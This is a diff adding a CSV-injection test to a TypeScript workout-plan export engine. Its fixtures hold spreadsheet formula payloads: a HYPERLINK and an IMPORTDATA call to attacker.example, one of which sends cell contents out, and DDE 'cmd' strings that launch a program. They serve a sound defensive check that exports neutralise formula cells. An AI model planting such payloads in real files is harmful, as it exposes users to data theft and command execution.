@@ -31,6 +31,46 @@ function workout(dayOffset: number, overrides: Partial<ExportGoalInput['workouts
     };
 }
 
+/** Strict RFC-4180 record parser: newlines inside quoted fields are part of
+ *  the cell (the behavior Excel/LibreOffice/Sheets rely on) and doubled
+ *  quotes unescape — used to prove the emitted CSV has no injected records. */
+function parseRfc4180(text: string): string[][] {
+    const records: string[][] = [];
+    let record: string[] = [];
+    let field = '';
+    let inQuotes = false;
+    for (let i = 0; i < text.length; i++) {
+        const ch = text[i];
+        if (inQuotes) {
+            if (ch === '"') {
+                if (text[i + 1] === '"') {
+                    field += '"';
+                    i++;
+                } else {
+                    inQuotes = false;
+                }
+            } else {
+                field += ch;
+            }
+        } else if (ch === '"') {
+            inQuotes = true;
+        } else if (ch === ',') {
+            record.push(field);
+            field = '';
+        } else if (ch === '\n') {
+            record.push(field);
+            records.push(record);
+            record = [];
+            field = '';
+        } else {
+            field += ch;
+        }
+    }
+    record.push(field);
+    records.push(record);
+    return records;
+}
+
 describe('plan export engine', () => {
     it('groups workouts into Monday-based weeks in order', () => {
         const plan = buildExportPlan(goal({
@@ -103,7 +143,45 @@ describe('plan export engine', () => {
         const lines = csv.split('\n');
         expect(lines[0]).toBe('Date,Day,Type,Description,Distance (km),Duration,Pace,Phase,Intensity Zone');
         expect(lines[1]).toContain('"Easy ""progression"" run"');
-        expect(lines[1]).toContain('Z2');
+        expect(lines[1]).toContain('"Z2"');
+    });
+
+    it('neutralizes formula cells and quotes embedded newlines (CSV injection)', () => {
+        const csv = buildCsv(buildExportPlan(goal({
+            workouts: [
+                workout(0, {
+                    customName: '=HYPERLINK("http://attacker.example/pixel?c="&A2,"View pace chart")',
+                    description: "=cmd|' /C calc'!A0",
+                    // A newline here used to escape the row and inject a raw
+                    // CSV line whose first cell was an unquoted formula.
+                    intensityZone: 'Z3\n=IMPORTDATA("http://attacker.example/x.csv")',
+                }),
+                // `@`-leading formula trigger on its own row; Z4 stays the
+                // inert intensityZone control cell.
+                workout(1, { customName: "@SUM(1+1)*cmd|' /C calc'!A0", intensityZone: 'Z4' }),
+            ],
+        })));
+
+        const records = parseRfc4180(csv);
+        // header + 2 workouts — the embedded newline must NOT create a record
+        expect(records).toHaveLength(3);
+
+        const attackRow = records[1];
+        // Title cell neutralized with a leading apostrophe → inert text
+        expect(attackRow[3]).toBe("'=HYPERLINK(\"http://attacker.example/pixel?c=\"&A2,\"View pace chart\")");
+        // Intensity zone stayed ONE cell: newline inside quotes, not a new row
+        expect(attackRow[8]).toBe('Z3\n=IMPORTDATA("http://attacker.example/x.csv")');
+        // `@`-leading cell on the second row neutralized too
+        expect(records[2][3]).toBe("'@SUM(1+1)*cmd|' /C calc'!A0");
+        // Control cell untouched
+        expect(records[2][8]).toBe('Z4');
+
+        // No parsed cell value begins with a formula trigger
+        for (const record of records.slice(1)) {
+            for (const cell of record) {
+                expect(/^[=+\-@\t\r]/.test(cell.trim())).toBe(false);
+            }
+        }
     });
 
     it('names files like the web export', () => {
